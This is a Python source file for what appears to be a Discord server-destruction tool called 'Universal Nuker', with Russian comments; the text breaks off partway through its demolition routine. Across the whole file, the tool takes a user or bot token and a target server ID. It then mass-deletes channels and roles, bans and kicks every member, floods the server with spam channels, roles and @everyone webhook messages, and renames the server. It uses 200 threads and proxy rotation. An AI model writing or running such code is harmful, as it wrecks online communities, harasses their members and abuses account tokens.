import requests
import time
import random
import threading
import json
import os
import sys
import discord
from discord.ext import commands
from colorama import Fore, Style, init
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import asyncio
from pathlib import Path

# Добавляем src в путь для импорта UI компонентов
sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from src.utils.ui import (
        print_banner, print_header, print_separator, print_success, 
        print_error, print_warning, print_info, Spinner, ProgressBar, 
        Notification, confirm_action
    )
    from src.utils.logo import QuantumKitLogo
    NEW_UI_AVAILABLE = True
except ImportError:
    NEW_UI_AVAILABLE = False

init(autoreset=True)

class UniversalNuker:
    def __init__(self):
        self.token = None
        self.target_guild_id = None
        self.nuke_type = "token"  # token, bot
        self.mode = "full"
        self.success_count = 0
        self.failed_count = 0
        self.is_nuking = False
        self.proxies = []
        self.load_proxies()
        self.session = requests.Session()
        self.stats = {
            'start_time': None,
            'channels_deleted': 0,
            'roles_deleted': 0,
            'members_banned': 0,
            'members_kicked': 0,
            'spam_channels_created': 0,
            'webhooks_created': 0,
            'roles_created': 0,
            'templates_created': 0
        }
        
        # Performance settings - MAXIMUM MODE
        self.max_workers = 200  # Увеличиваем до 200 потоков для максимальной скорости
        self.request_delay = 0.005  # Минимальная задержка для максимальной скорости
        self.batch_size = 100  # Увеличиваем размер пакета для максимальной эффективности
        self.connection_pool_size = 200  # Размер пула соединений
        self.retry_attempts = 5  # Количество попыток при ошибках
        
        # Bot specific
        self.prefix = "!"
        self.status = "Universal Nuker"
        self.channel_name = "nuked"
        self.spam_content = "Server nuked by Universal Nuker"
        self.role_name = "nuked"
        self.webhook_name = "Nuker"
        self.amount = 1000
        self.intents = discord.Intents().all()
        self.intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.prefix, intents=self.intents)
        self.bot.remove_command("help")
        self.setup_bot()

    def load_proxies(self):
        """Load proxies from proxies.txt"""
        try:
            if os.path.exists('Tools/proxies.txt'):
                with open('Tools/proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"{Fore.CYAN}[*] Loaded {len(self.proxies)} proxies")
        except:
            pass

    def print_banner(self):
        """Print modern banner"""
        if NEW_UI_AVAILABLE:
            print_banner()
            print_header("Universal Nuker v7.0")
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(QuantumKitLogo.get_main_logo())
            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.CYAN}║                        UNIVERSAL NUKER v6.0                                 ║")
            print(f"{Fore.CYAN}║                           🚀 MAXIMUM PERFORMANCE MODE 🚀                    ║")
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝\n")

    def get_user_input(self):
        """Get user input with modern UI"""
        if NEW_UI_AVAILABLE:
            print_header("Universal Nuker Configuration")
            print_separator()
        else:
            print(f"{Fore.CYAN}[*] Universal Nuker Configuration")
            print(f"{Fore.CYAN}[*] =============================\n")
        
        # Nuke Type Selection
        if NEW_UI_AVAILABLE:
            print_info("Nuke Types:")
            print(f"{Fore.WHITE}    1. Token Nuker - нюк через токен пользователя")
            print(f"{Fore.WHITE}    2. Bot Nuker - нюк через бота (РЕКОМЕНДУЕТСЯ)")
            print(f"{Fore.RED}    3. 🚨 UNIVERSAL FULL DEMOLITION - Полный снос всего 🚨")
        else:
            print(f"{Fore.CYAN}[*] Nuke Types:")
            print(f"{Fore.WHITE}    1. Token Nuker - нюк через токен пользователя")
            print(f"{Fore.WHITE}    2. Bot Nuker - нюк через бота (РЕКОМЕНДУЕТСЯ)")
            print(f"{Fore.RED}    3. 🚨 UNIVERSAL FULL DEMOLITION - Полный снос всего 🚨")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Choose type (1-3, default: 2): ").strip()
                if not choice:  # Default to bot nuker
                    choice = '2'
                
                if choice == '1':
                    self.nuke_type = "token"
                    break
                elif choice == '2':
                    self.nuke_type = "bot"
                    break
                elif choice == '3':
                    self.nuke_type = "full_demolition"
                    break
                else:
                    if NEW_UI_AVAILABLE:
                        print_error("Invalid choice. Please enter 1-3.")
                    else:
                        print(f"{Fore.RED}[!] Invalid choice. Please enter 1-3.")
            except KeyboardInterrupt:
                if NEW_UI_AVAILABLE:
                    print_warning("Operation cancelled")
                else:
                    print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Get specific inputs based on type
        if self.nuke_type == "token":
            return self.get_token_input()
        elif self.nuke_type == "bot":
            return self.get_bot_input()
        elif self.nuke_type == "full_demolition":
            return self.get_demolition_input()

    def get_token_input(self):
        """Get inputs for token nuker with modern UI"""
        if NEW_UI_AVAILABLE:
            print_header("Token Configuration")
        else:
            print(f"\n{Fore.CYAN}[*] Token Configuration")
        
        while True:
            self.token = input(f"{Fore.YELLOW}[?] Discord Token: ").strip()
            if self.token:
                break
            else:
                if NEW_UI_AVAILABLE:
                    print_error("Token cannot be empty!")
                else:
                    print(f"{Fore.RED}[!] Token cannot be empty!")
        
        while True:
            self.target_guild_id = input(f"{Fore.YELLOW}[?] Target Server ID: ").strip()
            if self.target_guild_id.isdigit():
                break
            else:
                if NEW_UI_AVAILABLE:
                    print_error("Server ID must be numeric!")
                else:
                    print(f"{Fore.RED}[!] Server ID must be numeric!")
        
        return True

    def get_bot_input(self):
        """Get inputs for bot nuker with modern UI"""
        if NEW_UI_AVAILABLE:
            print_header("Bot Configuration")
        else:
            print(f"\n{Fore.CYAN}[*] Bot Configuration")
        
        while True:
            self.token = input(f"{Fore.YELLOW}[?] Bot Token: ").strip()
            if self.token:
                break
            else:
                if NEW_UI_AVAILABLE:
                    print_error("Bot token cannot be empty!")
                else:
                    print(f"{Fore.RED}[!] Bot token cannot be empty!")
        
        while True:
            self.target_guild_id = input(f"{Fore.YELLOW}[?] Target Server ID: ").strip()
            if self.target_guild_id.isdigit():
                break
            else:
                if NEW_UI_AVAILABLE:
                    print_error("Server ID must be numeric!")
                else:
                    print(f"{Fore.RED}[!] Server ID must be numeric!")
        
        self.channel_name = input(f"{Fore.YELLOW}[?] Channel name (default: nuked): ").strip() or "nuked"
        self.spam_content = input(f"{Fore.YELLOW}[?] Spam message (default: Server nuked): ").strip() or "Server nuked by Universal Nuker"
        self.role_name = input(f"{Fore.YELLOW}[?] Role name (default: nuked): ").strip() or "nuked"
        
        return True

    def get_demolition_input(self):
        """Get inputs for full demolition mode with modern UI"""
        if NEW_UI_AVAILABLE:
            print_header("🚨 UNIVERSAL FULL DEMOLITION CONFIGURATION 🚨")
            print_warning("This mode will completely destroy the server with ALL available methods!")
            print_error("Recovery will be IMPOSSIBLE after this operation!")
        else:
            print(f"\n{Fore.RED}[*] 🚨 UNIVERSAL FULL DEMOLITION CONFIGURATION 🚨")
            print(f"{Fore.RED}[*] This mode will completely destroy the server with ALL available methods!")
            print(f"{Fore.RED}[*] Recovery will be IMPOSSIBLE after this operation!")
        
        while True:
            self.token = input(f"{Fore.YELLOW}[?] Discord Token (User or Bot): ").strip()
            if self.token:
                break
            else:
                if NEW_UI_AVAILABLE:
                    print_error("Token cannot be empty!")
                else:
                    print(f"{Fore.RED}[!] Token cannot be empty!")
        
        while True:
            self.target_guild_id = input(f"{Fore.YELLOW}[?] Target Server ID: ").strip()
            if self.target_guild_id.isdigit():
                break
            else:
                if NEW_UI_AVAILABLE:
                    print_error("Server ID must be numeric!")
                else:
                    print(f"{Fore.RED}[!] Server ID must be numeric!")
        
        # Test token before proceeding
        if NEW_UI_AVAILABLE:
            print_info("Testing token and server access...")
        else:
            print(f"{Fore.CYAN}[*] Testing token and server access...")
        
        # Validate token format
        if not self.token or len(self.token.strip()) < 10:
            if NEW_UI_AVAILABLE:
                print_error("Invalid token! Token is empty or too short.")
            else:
                print(f"{Fore.RED}[!] Invalid token! Token is empty or too short.")
            return False
        
        if NEW_UI_AVAILABLE:
            print_info(f"Token length: {len(self.token)}")
            print_info(f"Token starts with: {self.token[:10]}...")
        else:
            print(f"{Fore.CYAN}[DEBUG] Token length: {len(self.token)}")
            print(f"{Fore.CYAN}[DEBUG] Token starts with: {self.token[:10]}...")
        
        self.setup_session()
        if not self.get_guild_info():
            if NEW_UI_AVAILABLE:
                print_error("Token test failed! Please check your token and server ID.")
                print_warning("Make sure:")
                print_warning("- Token is valid and not expired")
                print_warning("- Bot is in the server (for bot tokens)")
                print_warning("- You have admin permissions (for user tokens)")
                print_warning("- Server ID is correct")
                print_info("See TOKEN_HELP.md for detailed instructions")
            else:
                print(f"{Fore.RED}[!] Token test failed! Please check your token and server ID.")
                print(f"{Fore.YELLOW}[!] Make sure:")
                print(f"{Fore.YELLOW}[!] - Token is valid and not expired")
                print(f"{Fore.YELLOW}[!] - Bot is in the server (for bot tokens)")
                print(f"{Fore.YELLOW}[!] - You have admin permissions (for user tokens)")
                print(f"{Fore.YELLOW}[!] - Server ID is correct")
                print(f"{Fore.CYAN}[!] See TOKEN_HELP.md for detailed instructions")
            return False
        
        # Additional demolition settings
        self.channel_name = input(f"{Fore.YELLOW}[?] Spam channel name (default: DEMOLISHED): ").strip() or "DEMOLISHED"
        self.spam_content = input(f"{Fore.YELLOW}[?] Spam message (default: SERVER DEMOLISHED): ").strip() or "SERVER DEMOLISHED BY UNIVERSAL NUKER"
        self.role_name = input(f"{Fore.YELLOW}[?] Spam role name (default: DEMOLISHED): ").strip() or "DEMOLISHED"
        
        if NEW_UI_AVAILABLE:
            print_success("Token verified successfully!")
            print_error("Full demolition mode configured!")
            print_error(f"Ready to completely destroy server: {self.target_guild_id}")
        else:
            print(f"{Fore.GREEN}[+] Token verified successfully!")
            print(f"{Fore.RED}[!] Full demolition mode configured!")
            print(f"{Fore.RED}[!] Ready to completely destroy server: {self.target_guild_id}")
        
        return True



    def setup_session(self):
        """Оптимизированная настройка сессии с connection pooling и retry механизмом"""
        # Настройка connection pooling для максимальной производительности
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.connection_pool_size,
            pool_maxsize=self.connection_pool_size,
            max_retries=self.retry_attempts,
            pool_block=False
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        if self.token:
            # Check if token is already formatted
            if self.token.startswith('Bot ') or self.token.startswith('Bearer '):
                headers['Authorization'] = self.token
                print(f"{Fore.CYAN}[DEBUG] Using pre-formatted token: {self.token[:20]}...")
            else:
                # Try both Bot and Bearer formats
                headers['Authorization'] = f'Bot {self.token}'
                print(f"{Fore.CYAN}[DEBUG] Formatted token as Bot: Bot {self.token[:20]}...")
        
        self.session.headers.update(headers)
        print(f"{Fore.CYAN}[DEBUG] Final Authorization header: {self.session.headers.get('Authorization', 'None')[:30]}...")

    def get_proxy(self):
        """Get random proxy"""
        if self.proxies:
            return {'http': f'http://{random.choice(self.proxies)}', 'https': f'http://{random.choice(self.proxies)}'}
        return None

    def get_guild_info(self):
        """Get guild information"""
        try:
            print(f"{Fore.CYAN}[DEBUG] Testing server access with token...")
            print(f"{Fore.CYAN}[DEBUG] Server ID: {self.target_guild_id}")
            
            # First try with Bot format
            response = self.session.get(f'https://discord.com/api/v9/guilds/{self.target_guild_id}')
            print(f"{Fore.CYAN}[DEBUG] First attempt status: {response.status_code}")
            
            # If 401, try with Bearer format
            if response.status_code == 401:
                print(f"{Fore.YELLOW}[!] Bot token failed, trying user token...")
                # Extract token without 'Bot ' prefix if present
                clean_token = self.token.replace('Bot ', '').replace('Bearer ', '')
                self.session.headers['Authorization'] = f'Bearer {clean_token}'
                print(f"{Fore.CYAN}[DEBUG] Trying Bearer format: Bearer {clean_token[:20]}...")
                response = self.session.get(f'https://discord.com/api/v9/guilds/{self.target_guild_id}')
                print(f"{Fore.CYAN}[DEBUG] Second attempt status: {response.status_code}")
            
            if response.status_code == 200:
                guild_data = response.json()
                print(f"{Fore.GREEN}[+] Target server: {guild_data['name']}")
                print(f"{Fore.GREEN}[+] Server ID: {guild_data['id']}")
                print(f"{Fore.GREEN}[+] Owner ID: {guild_data['owner_id']}")
                print(f"{Fore.GREEN}[+] Token type: {'Bot' if 'Bot ' in self.session.headers['Authorization'] else 'User'}")
                return True
            elif response.status_code == 401:
                print(f"{Fore.RED}[!] Authentication failed (401) - Invalid token or insufficient permissions")
                print(f"{Fore.YELLOW}[!] Make sure your token is valid and has proper permissions")
                print(f"{Fore.YELLOW}[!] For bot tokens, ensure the bot is in the server")
                print(f"{Fore.YELLOW}[!] For user tokens, ensure you have admin permissions")
                print(f"{Fore.CYAN}[!] See TOKEN_HELP.md for detailed instructions")
                print(f"{Fore.CYAN}[DEBUG] Full response: {response.text}")
                return False
            elif response.status_code == 403:
                print(f"{Fore.RED}[!] Forbidden (403) - No access to this server")
                print(f"{Fore.CYAN}[DEBUG] Full response: {response.text}")
                return False
            elif response.status_code == 404:
                print(f"{Fore.RED}[!] Server not found (404) - Check server ID")
                print(f"{Fore.CYAN}[DEBUG] Full response: {response.text}")
                return False
            else:
                print(f"{Fore.RED}[!] Failed to get server info: {response.status_code}")
                print(f"{Fore.RED}[!] Response: {response.text}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting server info: {e}")
            return False

    def delete_channels(self):
        """Оптимизированное удаление каналов с batch processing и улучшенной обработкой ошибок"""
        try:
            response = self.session.get(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/channels')
            if response.status_code == 200:
                channels = response.json()
                print(f"{Fore.CYAN}[*] Found {len(channels)} channels to delete with {self.max_workers} workers")
                
                def delete_channel_batch(channel_batch):
                    """Удаление батча каналов"""
                    batch_results = []
                    for channel in channel_batch:
                        if not self.is_nuking:
                            break
                        
                        channel_id = channel['id']
                        channel_name = channel['name']
                        
                        try:
                            delete_response = self.session.delete(f'https://discord.com/api/v9/channels/{channel_id}')
                            if delete_response.status_code in [200, 204]:
                                self.stats['channels_deleted'] += 1
                                print(f"{Fore.GREEN}[+] Deleted channel: {channel_name}")
                                batch_results.append(True)
                            else:
                                print(f"{Fore.RED}[!] Failed to delete channel {channel_name}: {delete_response.status_code}")
                                batch_results.append(False)
                        except Exception as e:
                            print(f"{Fore.RED}[!] Error deleting channel {channel_name}: {e}")
                            batch_results.append(False)
                        
                        time.sleep(self.request_delay)  # Минимальная задержка между каналами
                    
                    return batch_results
                
                # Разбиваем каналы на батчи для batch processing
                channel_batches = [channels[i:i + self.batch_size] for i in range(0, len(channels), self.batch_size)]
                
                # Обрабатываем батчи параллельно
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    futures = [executor.submit(delete_channel_batch, batch) for batch in channel_batches]
                    
                    for future in as_completed(futures):
                        if not self.is_nuking:
                            break
                        try:
                            future.result()
                        except Exception as e:
                            print(f"{Fore.RED}[!] Batch error: {e}")
                            
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting channels: {e}")

    def delete_roles(self):
        """Оптимизированное удаление ролей с batch processing и улучшенной обработкой ошибок"""
        try:
            response = self.session.get(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/roles')
            if response.status_code == 200:
                roles = response.json()
                # Фильтруем роли, исключая @everyone
                roles_to_delete = [role for role in roles if role['name'] != '@everyone']
                print(f"{Fore.CYAN}[*] Found {len(roles_to_delete)} roles to delete with {self.max_workers} workers")
                
                def delete_role_batch(role_batch):
                    """Удаление батча ролей"""
                    batch_results = []
                    for role in role_batch:
                        if not self.is_nuking:
                            break
                        
                        role_id = role['id']
                        role_name = role['name']
                        
                        try:
                            delete_response = self.session.delete(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/roles/{role_id}')
                            if delete_response.status_code in [200, 204]:
                                self.stats['roles_deleted'] += 1
                                print(f"{Fore.GREEN}[+] Deleted role: {role_name}")
                                batch_results.append(True)
                            else:
                                print(f"{Fore.RED}[!] Failed to delete role {role_name}: {delete_response.status_code}")
                                batch_results.append(False)
                        except Exception as e:
                            print(f"{Fore.RED}[!] Error deleting role {role_name}: {e}")
                            batch_results.append(False)
                        
                        time.sleep(self.request_delay)  # Минимальная задержка между ролями
                    
                    return batch_results
                
                # Разбиваем роли на батчи для batch processing
                role_batches = [roles_to_delete[i:i + self.batch_size] for i in range(0, len(roles_to_delete), self.batch_size)]
                
                # Обрабатываем батчи параллельно
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    futures = [executor.submit(delete_role_batch, batch) for batch in role_batches]
                    
                    for future in as_completed(futures):
                        if not self.is_nuking:
                            break
                        try:
                            future.result()
                        except Exception as e:
                            print(f"{Fore.RED}[!] Batch error: {e}")
                            
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting roles: {e}")

    def ban_all_members(self):
        """Оптимизированное банирование участников с batch processing и улучшенной обработкой ошибок"""
        try:
            response = self.session.get(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/members?limit=1000')
            if response.status_code == 200:
                members = response.json()
                print(f"{Fore.CYAN}[*] Found {len(members)} members to ban with {self.max_workers} workers")
                
                def ban_member_batch(member_batch):
                    """Банирование батча участников"""
                    batch_results = []
                    for member in member_batch:
                        if not self.is_nuking:
                            break
                        
                        member_id = member['user']['id']
                        member_name = member['user']['username']
                        
                        try:
                            ban_response = self.session.put(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/bans/{member_id}', 
                                                          json={'delete_message_days': 7})
                            if ban_response.status_code in [200, 204]:
                                self.stats['members_banned'] += 1
                                print(f"{Fore.GREEN}[+] Banned member: {member_name}")
                                batch_results.append(True)
                            else:
                                print(f"{Fore.RED}[!] Failed to ban member {member_name}: {ban_response.status_code}")
                                batch_results.append(False)
                        except Exception as e:
                            print(f"{Fore.RED}[!] Error banning member {member_name}: {e}")
                            batch_results.append(False)
                        
                        time.sleep(self.request_delay)  # Минимальная задержка между участниками
                    
                    return batch_results
                
                # Разбиваем участников на батчи для batch processing
                member_batches = [members[i:i + self.batch_size] for i in range(0, len(members), self.batch_size)]
                
                # Обрабатываем батчи параллельно
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    futures = [executor.submit(ban_member_batch, batch) for batch in member_batches]
                    
                    for future in as_completed(futures):
                        if not self.is_nuking:
                            break
                        try:
                            future.result()
                        except Exception as e:
                            print(f"{Fore.RED}[!] Batch error: {e}")
                            
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting members: {e}")

    def kick_all_members(self):
        """Kick all members"""
        try:
            response = self.session.get(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/members?limit=1000')
            if response.status_code == 200:
                members = response.json()
                print(f"{Fore.CYAN}[*] Found {len(members)} members to kick")
                
                for member in members:
                    if not self.is_nuking:
                        break
                    
                    member_id = member['user']['id']
                    member_name = member['user']['username']
                    
                    try:
                        kick_response = self.session.delete(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/members/{member_id}')
                        if kick_response.status_code in [200, 204]:
                            self.stats['members_kicked'] += 1
                            print(f"{Fore.GREEN}[+] Kicked member: {member_name}")
                        else:
                            print(f"{Fore.RED}[!] Failed to kick member {member_name}: {kick_response.status_code}")
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error kicking member {member_name}: {e}")
                    
                    time.sleep(0.5)  # Rate limit protection
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting members: {e}")

    def create_spam_channels(self):
        """Оптимизированное создание спам каналов с batch processing и улучшенной обработкой ошибок"""
        print(f"{Fore.CYAN}[*] Creating optimized spam channels with {self.max_workers} workers...")
        
        def create_channel_batch(batch_indices):
            """Создание батча каналов"""
            batch_results = []
            for i in batch_indices:
                if not self.is_nuking:
                    break
                
                channel_name = f"{self.channel_name}-{i+1}"
                
                try:
                    channel_data = {
                        "name": channel_name,
                        "type": 0,  # Text channel
                        "topic": "Server nuked by Universal Nuker"
                    }
                    
                    response = self.session.post(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/channels', 
                                               json=channel_data)
                    if response.status_code in [200, 201]:
                        self.stats['spam_channels_created'] += 1
                        channel_info = response.json()
                        channel_id = channel_info['id']
                        print(f"{Fore.GREEN}[+] Created spam channel: {channel_name}")
                        
                        # Send spam message
                        message_data = {
                            "content": self.spam_content
                        }
                        
                        msg_response = self.session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                                                       json=message_data)
                        if msg_response.status_code in [200, 201]:
                            print(f"{Fore.GREEN}[+] Sent spam message to {channel_name}")
                        
                        batch_results.append(True)
                    else:
                        print(f"{Fore.RED}[!] Failed to create channel {channel_name}: {response.status_code}")
                        batch_results.append(False)
                except Exception as e:
                    print(f"{Fore.RED}[!] Error creating channel {channel_name}: {e}")
                    batch_results.append(False)
                
                time.sleep(self.request_delay)  # Минимальная задержка между каналами
            
            return batch_results
        
        # Создаем батчи индексов для batch processing
        channel_indices = list(range(100))  # Увеличиваем до 100 каналов
        index_batches = [channel_indices[i:i + self.batch_size] for i in range(0, len(channel_indices), self.batch_size)]
        
        # Обрабатываем батчи параллельно
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(create_channel_batch, batch) for batch in index_batches]
            
            for future in as_completed(futures):
                if not self.is_nuking:
                    break
                try:
                    future.result()
                except Exception as e:
                    print(f"{Fore.RED}[!] Batch error: {e}")

    def create_spam_roles(self):
        """Create spam roles with parallel processing"""
        print(f"{Fore.CYAN}[*] Creating spam roles...")
        
        role_names = [
            "nuked", "rekt", "owned", "destroyed", "annihilated", "obliterated",
            "terminated", "eliminated", "wiped", "erased", "deleted", "removed",
            "gone", "dead", "finished", "over", "done", "kaput", "busted", "broken"
        ]
        
        def create_role(i, role_name):
            if not self.is_nuking:
                return False
            
            try:
                role_data = {
                    "name": f"{role_name}-{i+1}",
                    "color": random.randint(0, 0xFFFFFF),
                    "hoist": True,
                    "mentionable": True,
                    "permissions": "0"  # No permissions
                }
                
                response = self.session.post(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/roles', 
                                           json=role_data)
                if response.status_code in [200, 201]:
                    self.stats['roles_created'] += 1
                    print(f"{Fore.GREEN}[+] Created spam role: {role_data['name']}")
                    return True
                else:
                    print(f"{Fore.RED}[!] Failed to create role {role_data['name']}: {response.status_code}")
                    return False
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating role {role_data['name']}: {e}")
                return False
        
        # Process roles in parallel batches
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(create_role, i, role_name) for i, role_name in enumerate(role_names)]
            
            for future in as_completed(futures):
                if not self.is_nuking:
                    break
                try:
                    future.result()
                    time.sleep(self.request_delay)  # Reduced delay
                except Exception as e:
                    print(f"{Fore.RED}[!] Thread error: {e}")

    def create_server_template(self):
        """Create server template to prevent recovery"""
        print(f"{Fore.CYAN}[*] Creating server template...")
        
        try:
            template_data = {
                "name": "NUKED_SERVER_TEMPLATE",
                "description": "Server nuked by Universal Nuker - Recovery Impossible"
            }
            
            response = self.session.post(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/templates', 
                                       json=template_data)
            if response.status_code in [200, 201]:
                template_info = response.json()
                template_code = template_info.get('code', 'Unknown')
                self.stats['templates_created'] += 1
                print(f"{Fore.GREEN}[+] Created server template: {template_code}")
                print(f"{Fore.RED}[!] Server template created - Recovery will be impossible!")
                return True
            else:
                print(f"{Fore.RED}[!] Failed to create server template: {response.status_code}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error creating server template: {e}")
            return False

    def change_server_settings(self):
        """Change server settings to make recovery harder"""
        print(f"{Fore.CYAN}[*] Changing server settings...")
        
        try:
            # Change server name
            server_data = {
                "name": "NUKED_SERVER",
                "description": "This server has been nuked by Universal Nuker"
            }
            
            response = self.session.patch(f'https://discord.com/api/v9/guilds/{self.target_guild_id}', 
                                        json=server_data)
            if response.status_code in [200, 201]:
                print(f"{Fore.GREEN}[+] Changed server name to: NUKED_SERVER")
            else:
                print(f"{Fore.RED}[!] Failed to change server name: {response.status_code}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error changing server settings: {e}")

    def create_webhooks(self):
        """Create webhooks with parallel processing"""
        print(f"{Fore.CYAN}[*] Creating webhooks...")
        
        def create_webhook_and_spam(i):
            if not self.is_nuking:
                return False
            
            webhook_name = f"Nuker-{i+1}"
            
            try:
                webhook_data = {
                    "name": webhook_name,
                    "avatar": None
                }
                
                response = self.session.post(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/webhooks', 
                                           json=webhook_data)
                if response.status_code in [200, 201]:
                    self.stats['webhooks_created'] += 1
                    webhook_info = response.json()
                    webhook_url = webhook_info.get('url', 'Unknown')
                    print(f"{Fore.GREEN}[+] Created webhook: {webhook_name}")
                    
                    # Send spam via webhook
                    spam_data = {
                        "content": f"@everyone Server nuked by {webhook_name}",
                        "username": webhook_name
                    }
                    
                    webhook_response = self.session.post(webhook_url, json=spam_data)
                    if webhook_response.status_code in [200, 204]:
                        print(f"{Fore.GREEN}[+] Sent webhook spam: {webhook_name}")
                    
                    return True
                else:
                    print(f"{Fore.RED}[!] Failed to create webhook {webhook_name}: {response.status_code}")
                    return False
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating webhook {webhook_name}: {e}")
                return False
        
        # Process webhooks in parallel batches
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(create_webhook_and_spam, i) for i in range(10)]
            
            for future in as_completed(futures):
                if not self.is_nuking:
                    break
                try:
                    future.result()
                    time.sleep(self.request_delay)  # Reduced delay
                except Exception as e:
                    print(f"{Fore.RED}[!] Thread error: {e}")

    def full_demolition_mode(self):
        """UNIVERSAL FULL DEMOLITION - Complete server destruction with all capabilities"""
        print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║                    🚨 UNIVERSAL FULL DEMOLITION MODE 🚨                    ║")
        print(f"{Fore.RED}║                           COMPLETE SERVER DESTRUCTION                        ║")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Fore.RED}[!] WARNING: This will completely destroy the server with ALL available methods!")
        print(f"{Fore.RED}[!] This includes: Channels, Roles, Members, Spam, Webhooks, Templates, Settings")
        print(f"{Fore.RED}[!] Recovery will be IMPOSSIBLE after this operation!")
        
        # Confirmation
        try:
            confirm = input(f"\n{Fore.YELLOW}[?] Type 'DEMOLISH' to confirm full destruction: ").strip()
            if confirm != "DEMOLISH":
                print(f"{Fore.YELLOW}[!] Full demolition cancelled")
                return False
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Full demolition cancelled")
            return False
        
        print(f"{Fore.RED}[!] FULL DEMOLITION CONFIRMED - Starting complete destruction sequence...")
        print(f"{Fore.RED}[!] This operation cannot be stopped once started!")
        
        self.is_nuking = True
        self.stats['start_time'] = time.time()
        
        try:
            # PHASE 1: DESTROY EXISTING STRUCTURE
            print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║                              PHASE 1: DESTROY STRUCTURE                        ║")
            print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
            
            # Get server info first
            if not self.get_guild_info():
                print(f"{Fore.RED}[!] Failed to get server info - stopping demolition")
                return False
            
            # Delete ALL channels with maximum speed
            print(f"{Fore.RED}[*] PHASE 1.1: Deleting ALL channels...")
            self.delete_channels()
            
            # Delete ALL roles with maximum speed
            print(f"{Fore.RED}[*] PHASE 1.2: Deleting ALL roles...")
            self.delete_roles()
            
            # Ban ALL members with maximum speed
            print(f"{Fore.RED}[*] PHASE 1.3: Banning ALL members...")
            self.ban_all_members()
            
            # Kick remaining members as backup
            print(f"{Fore.RED}[*] PHASE 1.4: Kicking remaining members...")
            self.kick_all_members()
            
            # PHASE 2: CREATE CHAOS
            print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║                              PHASE 2: CREATE CHAOS                            ║")
            print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
            
            # Create massive spam channels
            print(f"{Fore.RED}[*] PHASE 2.1: Creating MASSIVE spam channels...")
            self.create_spam_channels()
            
            # Create massive spam roles
            print(f"{Fore.RED}[*] PHASE 2.2: Creating MASSIVE spam roles...")
            self.create_spam_roles()
            
            # Create destructive webhooks
            print(f"{Fore.RED}[*] PHASE 2.3: Creating destructive webhooks...")
            self.create_webhooks()
            
            # PHASE 3: FINAL DESTRUCTION
            print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║                            PHASE 3: FINAL DESTRUCTION                         ║")
            print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
            
            # Change server settings to make recovery impossible
            print(f"{Fore.RED}[*] PHASE 3.1: Changing server settings...")
            self.change_server_settings()
            
            # Create server template (FINAL DESTRUCTION)
            print(f"{Fore.RED}[*] PHASE 3.2: Creating server template (FINAL DESTRUCTION)...")
            self.create_server_template()
            
            # PHASE 4: EXTRA DESTRUCTION
            print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║                            PHASE 4: EXTRA DESTRUCTION                         ║")
            print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
            
            # Create additional spam channels
            print(f"{Fore.RED}[*] PHASE 4.1: Creating additional spam channels...")
            self.create_extra_spam_channels()
            
            # Create additional webhooks
            print(f"{Fore.RED}[*] PHASE 4.2: Creating additional webhooks...")
            self.create_extra_webhooks()
            
            # Final server template
